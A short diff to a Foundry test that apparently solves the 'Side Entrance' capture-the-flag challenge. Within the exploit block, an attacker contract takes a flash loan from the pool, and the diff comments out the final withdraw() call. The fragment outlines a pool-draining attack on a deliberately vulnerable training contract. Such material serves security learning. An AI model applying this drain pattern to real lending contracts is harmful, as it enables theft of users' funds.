@@ -40,7 +40,7 @@ contract SideEntrance is Test {
         vm.startPrank(attacker);
         flashLoanEtherReceiver = new FlashLoanEtherReceiver(address(sideEntranceLenderPool));
         flashLoanEtherReceiver.flashLoan(ETHER_IN_POOL);
-        flashLoanEtherReceiver.withdraw();
+       // flashLoanEtherReceiver.withdraw();
         vm.stopPrank();
         /** EXPLOIT END **/
         validation();
